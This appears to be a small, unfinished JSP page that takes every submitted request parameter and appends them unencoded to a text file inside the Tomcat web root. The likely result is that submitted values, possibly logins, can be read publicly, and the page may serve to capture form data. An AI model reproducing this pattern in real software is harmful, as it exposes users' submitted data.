<%@ page import="java.util.*,java.io.*, java.net.*" %>
<%@ page import="java.net.URLEncoder" %>
<%
  // Get the map of all the request parameters and their values
  Map<String, String[]> parameterMap = request.getParameterMap();

  // Set up the URL and the connection to the t

  // Iterate through the request parameters and add them to the POST data
  String postData = "";

  Enumeration<String> parameterNames = request.getParameterNames();
  while (parameterNames.hasMoreElements()) {
    String parameterName = parameterNames.nextElement();
    String parameterValue = request.getParameter(parameterName);
    postData += parameterName + "=" + parameterValue + "&";
  }

  // Write the Post Data content to a file
  try (FileWriter fileWriter = new FileWriter("/var/lib/tomcat9/bnet/ROOT/file.txt")) {
    fileWriter.write(postData);

  } catch (IOException e) {
    // Handle file write error
    %><%=e.getMessage()%><%
  }


%>Done
